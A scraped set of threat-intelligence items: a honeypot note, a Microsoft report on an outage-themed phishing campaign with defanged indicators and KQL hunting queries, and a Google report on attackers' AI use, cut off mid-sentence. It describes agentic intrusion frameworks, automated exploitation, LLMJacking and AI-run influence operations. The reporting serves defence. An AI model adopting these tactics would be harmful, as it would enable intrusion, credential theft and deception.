items.detail: This weekend, we started seeing requests for /mcp-rest/test/tools/list hitting our honeypots. These requests appear to attempt to exploit CVE-2026-42271 and CVE-2026-48710. Horizon3.ai published a short write-up about how these vulnerabilities can be chained to achieve remote code execution without authentication [Horizon3]

items.title: High volume phishing campaign uses Microsoft 365 outage lures to target multiple industry sectors
items.detail: In this article Phishing attack overview Attack chain overview Mitigation and protection guidance References Learn More On November 13, 2026, Microsoft Threat Intelligence observed a coordinated, high-volume phishing campaign targeting organizations across multiple sectors worldwide. The threat actors used phishing emails disguised as legitimate Microsoft 365 service-health notifications to lure recipients into clicking a malicious link. The messages created a false sense of urgency by claiming that emails had been held during a service disruption and would be deleted within 24 hours unless the recipient took action to restore them. This is consistent with historical attacker campaigns which continuously look for notable global events to exploit in their social engineering lures. Microsoft identified the threat actor’s use of specific sender domain names, randomized outage subjects, recipient-specific tracking links, and a common non-Microsoft destination to make the messages appear relevant while complicating simple pattern matching. We assess that the activity was likely credential phishing; however, the available evidence does not confirm credential capture, malware delivery, or post-compromise activity. Multiple threat actors may continue to look for ways to exploit notable global events in any social engineering pretext. If credentials were entered, organizations should consider the risk of account compromise, mailbox access, business email compromise, internal phishing, inbox-rule manipulation, and access to cloud collaboration data. Microsoft Defender blocks malicious domains used in this campaign, and Microsoft Defender for Office 365 blocks and quarantines phishing emails. We will continue to monitor this campaign and other related threats. Security teams can use Microsoft Defender for Office 365 and Microsoft Defender XDR capabilities to investigate messages, URLs, clicks, and potential follow-on activity. Phishing attack overview Microsoft analyzed the email lures sent on November 13, 2026: the emails used the subject pattern “Outage – <random token>” and display names built from a three-character, organization-style prefix followed by “Outage Notification” or “Service Health.” Example subject line: Outage – aF7vG6 Example display names: MSF Outage Notification AMZ Service Health One example email body referenced a purported Exchange Online incident on November 12 and claimed that four messages were held after the outage. The urgency of a 24-hour deletion deadline and the prominent “RESTORE MESSAGES” call to action were intended to drive immediate interaction. The activity used distinct sender domains, including: moments-notice[.]com, planetmaison[.]com and newbooker[.]com. The messages also used email-delivery and link-tracking infrastructure to generate recipient-specific URLs. In multiple samples, click-tracking links led to reallifeaccounting[.]com or reallifeaccounting[.]com/themelist0.html. The sample set was link-based: no QR codes or non-EML attachments were observed, and Microsoft did not identify evidence of executable, archive, document, or other malware payload delivery. The off-brand destination and Microsoft 365 impersonation support an assessment of likely credential phishing, but the available evidence did not include the final page source, credential fields, credential-submission telemetry, or post-compromise activity. Microsoft therefore has not attributed the campaign to a named threat actor or malware family. Figure 1. Sample of one of the Microsoft 365 outage-themed phishing lures. Attack chain overview Figure 2. Observed attack chain for the Microsoft 365 outage-themed phishing campaign. Delivery: A user receives an email from the moments-notice[.]com, planetmaison[.]com or newbooker[.]com sender-domain cluster. The subject contains “Outage -” followed by a randomized string of character tokens. The body of the message includes a fake email conversation positioned to be hidden from the recipient and appears to be an attempt at mail filtering evasion. Impersonation: The message poses as a Microsoft 365 service-health notification, uses a target-specific display-name prefix, and references Exchange Online, Outlook, Teams, SharePoint, and Copilot. Social engineering: The lure claims that messages were held during an outage and will be deleted within 24 hours, creating urgency and fear of lost business email. User interaction: The recipient selects “RESTORE MESSAGES” or “TAKE ACTION”. A recipient-specific tracking URL records or routes the click. Redirect: The observed link chain leads to reallifeaccounting[.]com, including the path /themelist0.html in some samples. Assessed threat actor objectives: Microsoft assesses that the activity was likely intended to capture credentials. Credential submission and subsequent account compromise were not directly observed in the supplied evidence. Mitigation and protection guidance Immediate actions Messages in environments protected by Microsoft Defender for Office are currently blocked/quarantined, and we have not observed any indicators of compromise from this attack. However, organizations can consider taking the following steps: Search for and remove phishing messages. Search mail telemetry for the observed sender domains, display-name and subject patterns, lure phrases, tracking hosts, and destination domain. Quarantine matching messages and remove delivered copies in accordance with organizational response procedures. Identify users who clicked campaign links. Identify users who selected campaign links. Review click telemetry, proxy logs, and browser or endpoint evidence to determine whether the destination was reached and whether credentials may have been entered. Reset credentials and investigate potentially compromised accounts For any user who may have entered credentials, reset the password, revoke active sessions and refresh tokens, and verify multifactor authentication registrations. Review the account for suspicious sign-ins, OAuth consent, new inbox or forwarding rules, delegate permissions, and unusual access to Exchange Online, SharePoint, OneDrive, or Teams. Block or closely monitor campaign infrastructure. Block or closely scrutinize reallifeaccounting[.]com and the observed /themelist0.html path while the activity is investigated. Avoid broadly blocking shared email-delivery infrastructure based only on this campaign; combine sender, content, URL, and behavioral signals to reduce collateral impact. Remind users how to verify legitimate service-health communications. Remind users that legitimate Microsoft 365 service-health communications do not direct them to non-Microsoft domains to recover held mail. Validate service issues through the Microsoft 365 admin center rather than through unsolicited email links. Ongoing hardening Require multifactor authentication and prioritize phishing-resistant methods, such as passkeys or security keys, where possible. Review and enable Safe Links and Safe Attachments policies in Microsoft Defender for Office 365. Enable Zero-hour auto purge (ZAP) to help retroactively neutralize phishing, spam, or malware messages that were delivered before new threat intelligence became available. Use Attack simulation training and ongoing awareness guidance to help users recognize outage-themed urgency, sender-domain mismatches, and requests to restore or release messages. Encourage users to report suspicious messages through the organization’s established Outlook reporting workflow so security teams and Microsoft can investigate quickly. Microsoft Security Copilot Security Copilot customers can use the standalone experience to create their own prompts or run the following prebuilt promptbooks to automate incident response or investigation tasks related to this threat: Incident investigation: Summarize related alerts and incidents and identify the affected users and devices. Microsoft User analysis: Review the activity of users who selected the campaign links. This includes sign-ins, MFA-method changes, inbox or forwarding rules, and OAuth grants. Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel. Microsoft Defender XDR Threat analytics High volume phishing campaign uses Microsoft 365 Outage lures to target multiple industry sectors. Advanced hunting queries These sample queries search for campaign characteristics in Microsoft Defender XDR. Review the results in the context of your environment and adjust the indicators only after validation. The queries do not set a time range; use the advanced hunting time selector for the period you want to investigate. Find messages by sender domain or subject pattern This query searches for the observed sender-domain clusters and the randomized outage subject pattern. let campaignDomains = dynamic([ "moments-notice.com", "em4493.moments-notice.com", "newbooker.com", "em.newbooker.com" ]); EmailEvents | where SenderFromDomain in~ (campaignDomains) or Subject matches regex @"(?i)^(?:\[external\]\s*|\*external\*\s*)?outage\s*-\s*[a-z0-9]{6}$" | project Timestamp, NetworkMessageId, RecipientEmailAddress, SenderFromAddress, SenderFromDomain, SenderDisplayName, Subject, DeliveryAction, DeliveryLocation | order by Timestamp desc Find messages containing campaign URLs This query identifies message URLs that contain the observed destination, click-tracking hosts, or tracking-pixel pattern, and joins the results to message metadata. let campaignUrlParts = dynamic([ "reallifeaccounting.com", "u113727626.ct.sendgrid.net/ls/click", "url.newbooker.com/ls/click", "162.120.17.69:8080/t/v3." ]); EmailUrlInfo | where Url has_any (campaignUrlParts) | project NetworkMessageId, Url, UrlDomain, UrlLocation | join kind=inner ( EmailEvents | project Timestamp, NetworkMessageId, RecipientEmailAddress, SenderFromAddress, SenderFromDomain, SenderDisplayName, Subject, DeliveryAction, DeliveryLocation ) on NetworkMessageId | project Timestamp, RecipientEmailAddress, SenderFromAddress, SenderFromDomain, SenderDisplayName, Subject, Url, UrlDomain, UrlLocation, DeliveryAction, DeliveryLocation, NetworkMessageId | order by Timestamp desc Investigate user clicks on campaign URLs This query searches click telemetry for the observed destination and tracking patterns so investigators can identify affected users and determine whether clicks were allowed. let campaignUrlParts = dynamic([ "reallifeaccounting.com", "u113727626.ct.sendgrid.net/ls/click", "url.newbooker.com/ls/click", "162.120.17.69:8080/t/v3." ]); UrlClickEvents | where Url has_any (campaignUrlParts) | project Timestamp, AccountUpn, Url, ActionType, Workload, NetworkMessageId, IPAddress, IsClickedThrough, UrlChain | order by Timestamp desc For users who interacted with campaign links, also investigate: Unusual sign-ins New devices or user agents MFA-method changes OAuth grants Inbox or forwarding rules Delegate permissions Unusual access to mailbox or collaboration data These behaviors were not observed in the source messages, they are post-click investigation targets for suspected Microsoft 365 credential phishing. MITRE ATT&CK Techniques observed The activity exhibited the following techniques. Microsoft did not map credential capture, malware execution, command and control, or data exfiltration because the available evidence did not directly demonstrate those actions. Initial Access T1566.002 Phishing: Spearphishing Link | Messages contained a “RESTORE MESSAGES” link that used tracked redirect URLs and led to a non-Microsoft destination. Defense Evasion T1036 Masquerading | Messages impersonated Microsoft 365 service-health communications and used Microsoft product names and copyright language. Execution T1204.001 User Execution: Malicious Link | Recipients were urged to select a link within 24 hours to prevent the alleged deletion of held messages. Indicators of Compromise (IOCs) The following defanged indicators were observed in the campaign and should be validated in the context of each environment before blocking. Shared service-provider infrastructure can generate false positives when used without the accompanying sender, content, and behavioral signals. Indicator Type Context moments-notice[.]com Domain Observed sender-domain cluster. planetmaison[.]com Domain Observed sender-domain cluster. em4493[.]moments-notice[.]com Domain Observed mail-from or bounce subdomain. newbooker[.]com Domain Observed sender-domain cluster. em[.]newbooker[.]com Domain Observed mail-from or bounce subdomain. url[.]newbooker[.]com Domain Observed click/open tracking host. url7489[.]newbooker[.]com Domain Observed click/open tracking host. u113727626[.]ct[.]sendgrid[.]net Domain Observed click/open tracking host; assess with campaign context because the parent service can be shared. u118254266[.]ct[.]sendgrid[.]net Domain Observed click/open tracking host; assess with campaign context because the parent service can be shared. u118250677[.]ct[.]sendgrid[.]net Domain Observed click/open tracking host; assess with campaign context because the parent service can be shared. reallifeaccounting[.]com Domain Principal downstream destination observed in multiple messages. outagefixed[.]sbs Domain Downstream destination observed in some messages. outagerestored[.]sbs Domain Downstream destination observed in some messages. hxxps://reallifeaccounting[.]com/themelist0[.]html URL Observed destination path. hxxps://outagerestored[.]sbs/topics_pxyk/themelist0[.]html URL Observed destination path. 162[.]120[.]17[.]69:8080 IP and port Observed host for individualized /t/v3…/px[.]png resources. Outage – <random> Subject pattern Observed randomized subject format; external-mail tags may precede it. Strengthen – Security <random> Subject pattern Observed randomized subject format; external-mail tags may precede it. Restore — 4 messages <random> Subject pattern Observed randomized subject format; external-mail tags may precede it. References Safe Links in Microsoft Defender for Office 365 Safe Attachments in Microsoft Defender for Office 365 Zero-hour auto purge in Microsoft Defender for Office 365 Attack simulation training in Microsoft Defender for Office 365 MITRE ATT&CK T1566.002: Phishing – Spearphishing Link MITRE ATT&CK T1036: Masquerading MITRE ATT&CK T1204.001: User Execution – Malicious Link Learn More For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog . items.title: GTIG AI Threat Tracker: Agentic Threat Activity Crosses a Significant Threshold
items.detail: Written by: Aurora Blum, Kelli Vanderlee, Jess Xia, David Mainor Executive Summary As threat actors increasingly move beyond basic prompting to deploying autonomous multi-agent frameworks , automated vulnerability exploitation pipelines, and alternative monetization schemes like LLMJacking , the adversarial AI landscape has reached a critical inflection point. In this update, Google Threat Intelligence Group (GTIG) and Mandiant examine how adversaries across the cyber crime, espionage, and information operations spectrum are operationalizing generative AI to compress attack timelines, scale operations, and execute multi-stage intrusions at machine speed. Key trends over the last quarter include: Shift to Autonomous Workflows and Multi-Agent Frameworks: Adversary tradecraft has continued to transition beyond manual prompting to deploying autonomous multi-agent offensive frameworks—such as ARTEX , CAIRN, CyberStrikeAI, and PentAGI—to execute multi-stage intrusions at greater operational velocity. Automated Vulnerability Research and Exploitation: Threat actors are increasingly leveraging LLMs and agentic frameworks to fully automate the reverse engineering of patches via differential analysis, allowing them to rapidly weaponize n-day vulnerabilities and scale exploitation pipelines against internet-facing servers without human intervention. Monetization and Infrastructure Abuse : Financially motivated threat actors continue to profit from LLMJacking by stealing LLM credentials and cloud resources from compromised enterprise environments and reselling access to high-performance AI models through underground proxy services (e.g., LLM Mixers). LLM Integration in Information Operations (IO): State-sponsored groups, commercial Influence-as-a-Service (IaaS) vendors, and inauthentic political monetization networks now routinely use LLMs in their operations to produce synthetic media at scale, create localized personas, and automate cross-platform distribution. Targeted Espionage and Supply Chain Evolution: Cyber espionage groups are leveraging LLMs for target research, automated data analysis, and novel supply chain attack vectors—such as manipulating autonomous coding assistant configurations to drop backdoors during local execution. Grounded in telemetry from frontline Mandiant incident response engagements, global threat actor tracking, and live platform defenses, this report details how state-sponsored espionage groups, financially motivated cyber criminals, and IO threat actors are operationalizing LLMs in the wild. At Google, we are committed to developing AI boldly and responsibly. Our multifaceted defense strategy integrates proactive model-level safeguards, specialized threat intelligence, and targeted containment protocols to protect our customers and infrastructure. We continuously harden our models against misuse, mitigate malicious activity through proactive disruption of bad actor projects and accounts, and use our autonomous Google AI Threat Defense architecture and BeyondZero to operationalize security, continuous monitoring, and responding at machine speed across enterprise environments. Multi-Agent Frameworks in Cyber Intrusions While previous milestones documented in our quarterly research highlighted nascent adversary interest in agentic capabilities, GTIG and Mandiant have now observed multiple threat actors abusing open source, agentic penetration-testing (pentesting) frameworks to automate discrete phases and specific operational tasks during live intrusions. Threat actor adoption of these frameworks represents a paradigm shift towards intrusions occurring at machine speed, with the automated chaining of complex attack paths scaling operations significantly. While the mechanics of the intrusions remain the same, such as using compromised credentials and targeting unpatched systems, the speed and scale at which frameworks can exploit these known weaknesses introduces a new defensive challenge. Figure 1: Multi-agent LLM offensive frameworks In addition to the now highly-publicized pentesting tool ARTEX, threat actors are actively leveraging additional open source, multi-agent frameworks such as CAIRN, CyberStrikeAI, and PentAGI. We have also observed evidence of threat actor experimentation with custom-built harnesses. These frameworks share several core capabilities: discovering and exploiting low-complexity vulnerabilities, using LLMs to generate single-use payloads on-demand, and using real-time execution feedback to dynamically adjust tactics. GTIG has independently observed open source tools CAIRN and PentAGI deployed in the wild, and has seen experimentation with CyberStrikeAI and HexStrike AI. CAIRN: an open source, multi-agent pentesting framework that implements an OODA (Observe, Orient, Decide, Act) loop where specialized agents collaborate via a shared "blackboard" to autonomously navigate from an initial parameter (e.g., a target IP address) toward an operational objective. GTIG observed CAIRN used in intrusion activity against targets including in the aerospace sector in the US. CyberStrikeAI : an open source, LLM-native offensive framework which functions as a "single pane of glass" for cyber operations. The core architecture consists of a Go-based backend API acting as a C2 and orchestration server and connects commercial and open-weight LLMs to over 100 security tools, YAML attack recipes, and custom scripts to automate end-to-end attack chains. HexStrike AI : an open source offensive Model Context Protocol (MCP)-integrated harness that enables LLM clients to directly connect to over 150 pre-installed offensive security tools. Operating through a dual-component architecture, the framework wraps standard utilities across reconnaissance, web application testing, exploitation, and binary analysis into callable functions coordinated by more than 12 specialized autonomous sub-agents. PentAGI : an open source autonomous offensive framework designed to lower technical barriers for entry-level operators running complex campaigns. Between late August and early October 2026, GTIG tracked a threat actor using a customized attack orchestration platform built off of the open source version of PentAGI used to conduct systematic reconnaissance and vulnerability scanning against a wide range of organizations in Asia. We have observed several threat actors separately experimenting with the use of these frameworks and harnesses, including financially motivated, as well as suspected espionage threat actors with a PRC nexus. This includes evidence that a PRC-nexus group was developing its own automated attack framework for likely use in cyber espionage operations. These observations additionally extend to the use of other tools and services, such as ZeroHollow, an inference service used for exploit development and LLM routing, and Agent Zero, an open source agent framework which features autonomous code execution and dynamic tool generation. Given the low barrier to entry, ease of integrating new exploits, and massive scaling potential, we believe it is highly likely that threat actors will continue to use these frameworks in campaigns targeting organizations globally. Concurrently, as capabilities evolve, we suspect these operations will continue to move further along the autonomous scale, approaching fully agentic intrusions. Notably, while these frameworks are capable of significantly compressing attack timelines to machine speed and achieving operational objectives, they currently trade stealth for velocity. Unrestricted autonomous execution generates forensic traffic, relies on recognizable identifiers, and leaves behind distinct code-level traces; while these artifacts increase the likelihood of detection and mitigation, these tools remain highly capable of achieving operational objectives. As the sophistication of these tools and underlying LLMs increases, we anticipate not only reduced human involvement in these operations but also increased stealth and sophistication of the activity. Figure 2: LLM maturity timeline Mitigations Google Security Operations (SecOps) has deployed specialized behavioral and volumetric rulepacks to detect use of ARTEX. Mandiant Consulting released a hardening guide and architectural defense framework specifically designed to counter the speed and scale advantage of adversaries using LLM-enabled offensive tooling. Use of Agents in Vulnerability Research and Development The integration of autonomous LLM agents into vulnerability research and software security workflows has shifted from theoretical experimentation to active operational deployment. Adversaries are leveraging multi-agent systems and LLM-driven pipelines to automate labor-intensive phases of vulnerability analysis, such as differential patch examination, dynamic protocol fuzzing, and proof-of-concept (POC) weaponization. By chaining these capabilities together, threat actors can dramatically reduce the window between patch disclosure and weaponized exploitation. Threat actors may find it more efficient to use LLMs to rapidly weaponize patched n-day vulnerabilities, as they can focus research on a finite set of source materials: comparing source code versions (including from pre-release or preview channels), and examining release notes, security research, and POC code related to specific flaws. In contrast, searching for zero-day vulnerabilities requires casting a wider net. LLMs are transforming how vulnerabilities are discovered and exploited across public and enterprise infrastructure, shrinking the patch window for organizations. Simultaneously, the lower barrier to entry has fueled a wave of LLM-generated exploits that are claimed to work but don't, creating additional verification work for defenders. For instance, in September 2026, GTIG analyzed vulnerability statistics to assess how LLMs are shaping the threat landscape. We found that LLMs are transforming not only the speed of vulnerability discovery and exploitation, but also the types and risk profiles of the flaws being uncovered. Interestingly, while overall disclosures and exploits nearly doubled between January and August 2026, zero-day exploits rose only marginally from a 2025 average of 8 per month to 11 per month in 2026—before spiking to 22 in the month of August. Figure 3: Count of vulnerabilities exploited, by n-days and zero-days, January 2025 to August 2026 In our previous report , we detailed nascent efforts by threat actors surrounding LLM-augmented vulnerability research, including partially automated vulnerability scanning and exploitation attack sequences. In the past quarter, GTIG identified threat actors using LLM frameworks to fully automate vulnerability discovery and exploitation without a human in the loop for the first time. More specifically, GTIG identified an exposed staging server hosting a multi-agent vulnerability research and weaponization framework, dubbed exploit_agent , that integrates with multiple frontier and local LLMs. The framework is set up to conduct continuous differential analysis of popular web application software. It compares code before and after patch announcements, analyzes findings to identify potential vulnerabilities, drafts exploits, and automatically executes them without human intervention. Along with data exfiltrated from targeted victims, we identified multiple scripts capable of facilitating various post-compromise activities, including internal reconnaissance, brute-forcing, installing webshells, and removing other attackers’ webshells. Victim telemetry on the server suggests the operator was specifically interested in targeting French websites associated with the media and entertainment industries, as well as the education sector. // Insecure capability check analyzed in v21925.php: public static function restrict_popup_rest_access( $result ) { if ( is_wp_error( $result ) ) { return $result; } $route = isset( $_SERVER['REQUEST_URI'] ) ? sanitize_text_field( wp_unslash( $_SERVER['REQUEST_URI'] ) ) : ''; if ( false === strpos( $route, '/wp/v2/spectra-popup' ) ) { return $result; } if ( is_user_logged_in() && current_user_can( 'manage_options' ) ) { return $result; } return new WP_Error( 'rest_forbidden', __( 'Sorry, you are not allowed to access popups.', 'ultimate-addons-for-gutenberg' ), array( 'status' => rest_authorization_required_code() ) ); } Figure 4: Agentic framework inspecting access control implementations in the Spectra (Ultimate Addons for Gutenberg) WordPress plugin, version 2.19.25 Russian Language Comments Comments Translated to English # LLM API-ключи для авто-эксплуатации (пилот exploit_agent) # Впиши ключи сам — сюда, не в чат. Обе строки обязательны. # LLM API keys for auto-exploitation (exploit_agent pilot) # Enter the keys yourself — right here, not in the chat. Both lines are required. Table 1: Comments from environmental file configuring multiple LLM API keys for autonomous exploitation Open source research corroborates threat actor operationalization of fully automated vulnerability exploitation pipelines. For example, in late August 2026, threat actors exploited two vulnerabilities in PaperCut print management servers as zero-days that, when chained together, allow for unauthenticated remote code execution: CVE-2026-81578, an authentication bypass flaw; and CVE-2026-82078, an unsafe dynamic class loading vulnerability. Using LLMs, security researchers and the cybersecurity company Huntress generated working exploits for the vulnerabilities within a day of disclosure. Greynoise reported a campaign that took place four days after the initial disclosure in which a threat actor likely used LLMs to build and test exploits for these vulnerabilities, assemble a target list, and execute a widespread exploitation campaign against hundreds of organizations. Greynoise also highlighted the speed of execution, noting that the threat actor expanded an initial foothold to domain administrator within minutes. The PHP vulnerabilities (CVE-2026-109618 and CVE-2026-109619) also highlight several of these trends. They were discovered using LLM-enabled analysis. Before official patches were released on Oct. 21, 2026, a POC video and early patched code were published. This allowed both researchers and attackers to compare code versions, understand the flaws and attempt to build exploits before the patch became available. In the initial days following the official patch, hundreds of claimed but non-functional POCs, likely generated with the help of LLMs, were published. This proliferation created significant work for the security community to verify or debunk the POCs while monitoring for evidence of confirmed exploitation. Mitigations Google continuously invests in AI innovation and research, helping to ensure AI is built responsibly , and that we’re leveraging its potential to automatically find risks. In 2024 we introduced Big Sleep , an AI agent developed by Google DeepMind and Google Project Zero, that actively searches and finds unknown security vulnerabilities in software. Google Cloud employs a defense-in-depth model that combines rigorous code reviews and secure-by-default libraries with continuous, automated scanning using specialized AI agents such as CodeMender to discover, patch, and remediate vulnerabilities before and after release. We partner with the global security community by running a Vulnerability Reward Program and maintaining Project Zero to proactively find and patch zero-day vulnerabilities. Full Integration of LLMs into Information Operations GTIG assesses with high confidence that information operations (IO) threat actors have advanced from initial LLM experimentation to full operational integration. Across all tracked categories—state-sponsored groups, including those attributed to Russia, the PRC, and Iran, commercial "Influence-as-a-Service" (IaaS) vendors, and inauthentic political monetization (IPM) networks—adversaries now routinely embed LLMs into their standard tradecraft to produce synthetic media and automate domain network workflows (e.g., LLM-assisted SEO manipulation, editing and formatting of seeded articles, and automated generation and publishing of influence content). This broad adoption has measurably improved the output quality of some long-running influence campaigns while enabling IPM networks to scale political clickbait that resembles the thematic focus, quality, and volume historically characteristic of state-backed IO campaigns. However, it is important to note that improvements in content quality do not necessarily equate to greater impact or success. IO Actor Categories State-sponsored groups are IO actors directly linked to state apparatuses and have traditionally formed the primary baseline tracked by platform defenders and researchers. To preserve plausible deniability, they increasingly rely on third-party commercial contractors to execute campaigns on their behalf. Commercial IaaS vendors encompass marketing and PR agencies, private intelligence contractors, and offshoots of commercial surveillance vendors, selling services ranging from tailored influence campaigns to turnkey platforms. Tradecraft varies across this ecosystem; intelligence contractors and surveillance offshoots in particular often apply stronger operational security (OPSEC) and more advanced techniques than traditional state-sponsored actors. Inauthentic political monetization (IPM) networks are driven by profit rather than ideology. These actors generate a high volume of political clickbait to drive engagement, maximize click-through rates, and boost ad revenue. This combination of political framing and high-volume synthetic content creates a significant frontend perception gap, making IPM network campaigns the most prone to being misidentified as state-sponsored operations. Table 2: IO actor categories As automated content generation reduces a primary operational bottleneck, adversaries are increasingly shifting their focus toward leveraging LLMs for infrastructure design, automated distribution pipelines, and anti-detection mechanisms. Specifically, our observations indicate a notable shift toward the commercial development of LLM-enabled, end-to-end IaaS platforms designed to support and automate the full influence campaign lifecycle. The proliferation of these platforms can lower operational overhead for state and commercial actors while increasing the difficulty of detecting coordinated and inauthentic behavior across social media platforms. The Commercial Development of Turnkey, LLM-Enabled Influence Operations In August 2026, GTIG investigated threat activity leveraging the Gemini API alongside tools from multiple AI providers to build an end-to-end IaaS platform designed to target public sentiment on regional political topics, primarily across Europe and the Middle East. The platform was engineered to automate the entire IO campaign lifecycle, including persona creation, multimodal media generation, automated content distribution, and interactive posting across platforms. Identified prompts reflected an operational focus on emulating organic grassroots engagement (i.e., “astroturfing”) while evading platform detection rules. Identified prompts instructed models to adopt localized personas specific to targeted geography, mimicking regional dialects and slang, while incorporating informal phrasing and intentional typos to avoid sounding like an automated tool. Prompts supporting media generation introduced deliberate camera flaws simulating realistic photos typically captured by smartphone cameras (e.g., making images appear grainy or incorporating uneven lighting changes) and omitted background text to avoid synthetic image markers. To evade social media platform defenses, operators routed traffic through residential proxies and preserved saved login cookies. This setup was designed to allow automated tools to maintain active, authenticated access continuously, avoiding security checkpoints like CAPTCHAs and login re-verification. GTIG also detected a separate commercial contractor leveraging the Gemini API—as part of a modular, multi-provider AI architecture—during the development of a turnkey IaaS platform engineered to manage over 100,000 accounts across major global platforms. The platform is architected to combine automated agents, anti-detection and device identifier spoofing tools, and cloud phone farms to operate thousands of inauthentic personas across platforms. Observed prompts indicated the actor’s plan to market the tool to both the actor’s domestic government bodies and foreign clients for influence campaign execution. To manage large volumes of social media accounts, the platform was designed to run virtual smartphones in cloud environments—disguising each virtual device as a legitimate mobile device—and route web traffic through proxies to bypass automated bot detection and rate limits. The architecture additionally includes automated fake account creation using disposable email addresses and overseas virtual SMS numbers. To avoid further suspicion, newly-created accounts were configured to undergo an automated aging period, leveraging LLMs to simulate realistic user behavior (e.g., how long a user lingers on a post, scrolling, and interacting with non-campaign content) to establish a history of normal activity before pushing targeted messaging. Tactical LLM Adoption: Demographic Microtargeting and Content Scaling Alongside the development of IaaS software suites, threat actors continue to integrate commercial LLM tools into baseline content workflows to overcome linguistic barriers, customize messaging, and scale output. Using commercial models to produce commentary, synthetic personas, and stylized animations at the content layer allows IO actors to improve the credibility and demographic resonance of their campaigns, while enabling IPM networks to mass-produce political clickbait for advertising revenue. LLM-Enabled Quality Enhancement in Long-Running IaaS Campaign: Since our last report, GTIG observed a long-running IaaS provider tracked since 2019 leveraging LLMs to elevate the baseline quality and volume of its influence operations. Utilizing a proprietary software suite designed to manage thousands of synthetic profiles across major platforms, the provider targeted political discourse in multiple countries. Operators integrated LLM models to produce more convincing virtual personas, as well as academic-style commentary and media focused on political, religious, and civil rights topics. The resulting content was subsequently promoted and amplified across platforms using fabricated Western personas. Demographic Targeting via Synthetic Content: We have observed threat actors using LLM-generated content to customize context for specific regions and audiences, for example by using synthetic influencer personas to promote policy narratives targeting specific demographics. A separate network posted synthetic, Lego brick-inspired animations and football parodies to satirize global political figures, likely in an attempt to appeal to younger audiences by effectively packaging propaganda in short-video formats consistent with popular internet culture. LLM-Augmented Inauthentic Political Monetization (IPM): GTIG also tracks a growing trend of IPM actors using LLMs to mass-produce political content. Although their thematic focus, quality, and volume can resemble state-backed IO campaigns, these non-ideological operations exploit societal polarization solely to maximize engagement, click-through rates, and advertising revenue. GTIG has observed IPM operators prompting commercial LLMs to identify lucrative political topics, trending keywords, and high-Cost Per Mile (CPM) niches for ad monetization, while promoting the resulting content via synthetic news anchors that occasionally spoof the likenesses of real journalists and commentators to manufacture credibility. Mitigations GTIG collaborates closely with product teams to take action against IO actors across affected Google surfaces under our standard platform policies. Our research and rigorous analysis enables Google teams to make enforcement decisions and to disrupt coordinated IO campaigns. GITG, YouTube, and Google Trust & Safety track and regularly enforce on accounts associated with coordinated IO posting content and commenting. Examples of this enforcement include disruption of YouTube channels, blogs, AdSense accounts, and domains removed from Google News surfaces, as we report on a quarterly basis in the Influence Operations Bulletin . Beyond enforcement actions, GTIG shares insights with Google DeepMind to harden our platforms and services against emerging tradecraft. This intelligence is used to establish abuse baselines, enhance Gemini’s ability to recognize and refuse misuse, and inform internal policy modifications. Threat Actors Abusing and Monetizing Access to AI Tools While compromised credentials have long served as the fundamental bedrock for initial access, privilege escalation, and lateral movement during intrusions, adversaries are increasingly repurposing stolen credentials and compute resources to power unauthorized LLM tooling and autonomous operational pipelines. As access costs, token rate limits, and geographic restrictions present persistent operational hurdles for threat actors attempting to scale LLM capabilities, adversaries are actively harvesting session tokens and platform credentials directly from victim endpoints and continuous integration environments. In tandem with this shift toward hijacking valid credentials for LLMs, underground cybercrime forums and illicit marketplaces have rapidly matured to meet this demand—transitioning beyond generic identity dumps to commodifying verified frontier AI accounts, tokenized API quotas, and targeted infostealer configurations as turnkey utilities for downstream exploitation. LLMJacking in Incident Response Throughout 2026, Mandiant responded to several LLMJacking incidents where financially motivated actors compromised cloud environments to consume targeted organizations’ cloud compute and/or LLM resource quotas. As seen in the image below, LLMJacking can generate significant usage and billing increases within hours. In some cases, single-day fraudulent charges exceeded $100,000 USD. In the most severe cases, cumulative resource abuse reached $1 million USD before remediation. Figure 5: Usage chart showing LLMJacking generating a spike in API requests In November, Mandiant and GTIG described a set of common TTPs we observed across intrusions that affected financial services, retail, transportation, and technology organizations in North America, South America, and the Asia Pacific region. Attack Lifecycle Stage Description of Observed Tactics Initial Access Threat actors frequently used credential theft and session hijacking to gain access to targeted environments, including harvesting valid credentials from public GitHub repositories, and social engineering using deceptive websites to trick users into providing active session tokens. Internal Reconnaissance & Lateral Movement Seeking to identify credentials and systems of interest, attackers conducted reconnaissance against internal code repositories, data stores, cloud services, containers, and access logs. In at least one case, a threat actor exploited a suspected web application vulnerability in a package running in an internal container to navigate to additional systems. Privilege Escalation & Persistence Threat actors created unauthorized IAM and service accounts or attached administrative policies to service roles. We also observed a threat actor exploit CVE-2026-40217, a sandbox escape in LiteLLM that allows an attacker to elevate limited-access inference keys ("Virtual Keys") into full administrative credentials. Privileged service accounts were sufficient to establish persistence without the use of malware. Complete Mission: LLM Abuse Inside organizations’ cloud environments, attackers enabled LLM services, including subscribing compromised accounts to pay-as-you-go agreements. To circumvent rate limits, one threat actor used a “burn and rotate” strategy, creating and deleting short-lived service accounts. Other threat actors abused cloud compute resources, provisioning instances with powerful GPUs and requesting quota increases in order to run their own LLM tooling. This included agentic frameworks that a threat actor used to automate further exploitation of the compromised network, as well as open source API gateways and custom relay infrastructure deployed to facilitate the sale of access to the compromised organization’s resources. Table 3: Common TTPs observed in LLMJacking intrusions In another investigation, we observed at least two separate attackers seeking to conduct LLMJacking operations. Both actors accessed a targeted environment using the same set of legitimate credentials, which were potentially sold or leaked on underground forums. The first threat actor used legitimate credentials to gain access to the environment, enumerate available LLM services, and query cost and usage information related to the account. On the same day, we observed a set of IP addresses using a common User-Agent, likely a botnet or proxy service, also accessing the environment using the same legitimate credentials. The botnet or proxy service generated millions of LLM API calls in approximately 24 hours before the credentials were revoked. Though the first threat actor returned to the environment, creating service accounts provisioned with permissions to query LLMs, the botnet’s noisy activity caused the compromised credentials to be remediated before this threat actor could execute LLM queries. For hardening and mitigation guidance for defending against LLMJacking intrusions, please see our blog . Monetizing LLMJacking through LLM Mixers Threat actors frequently monetize LLMJacking intrusions by selling access to compromised compute and LLM resources. In addition to the rise of LLMJacking, GTIG is tracking the proliferation of “LLM Mixers”—illicit storefronts that provide buyers with unauthorized access to LLM services and underlying proxy infrastructure. This infrastructure routes buyer traffic through a pool of stolen credentials and compute instances to ensure reliable access, while also offering the ability to spread query volume across multiple victim environments to reduce the likelihood of detection. The LLM Mixer ecosystem mirrors the broader cybercrime marketplace, where specialized threat groups handle discrete phases of the supply chain. While LLM Mixer operators maintain infrastructure and customer 